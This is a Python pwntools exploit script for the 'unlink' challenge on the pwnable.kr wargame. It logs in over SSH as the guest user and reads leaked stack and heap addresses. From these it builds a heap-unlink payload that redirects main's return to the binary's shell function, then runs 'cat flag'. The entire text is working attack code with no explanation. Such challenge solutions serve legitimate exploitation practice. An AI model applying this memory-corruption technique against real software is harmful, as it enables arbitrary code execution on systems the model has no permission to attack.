#!/usr/bin/env python
from pwn import *

e = ELF('./unlink')

context.binary = e

# io = process(e.path)

server = ssh('unlink', 'pwnable.kr', 2222, 'guest')

io = server.process('./unlink')

shell_address = e.symbols.shell


io.readuntil('stack address leak: 0x')

stackA_address = int(io.readline(False), 16)
main_ebp_address = stackA_address + 0x14
main_ret_p = main_ebp_address - 0x4


io.readuntil('heap address leak: 0x')

heapA_address = int(io.readline(False), 16)
heapA_buffer = heapA_address + 0x8
target = heapA_buffer + 0x4

payload = fit({0 : p32(shell_address), 16 : p32(target), 20 : p32(main_ret_p)})


io.sendline(payload)
io.sendline('cat flag')
io.sendline('exit')
print(io.recvall())

io.close()
server.close()
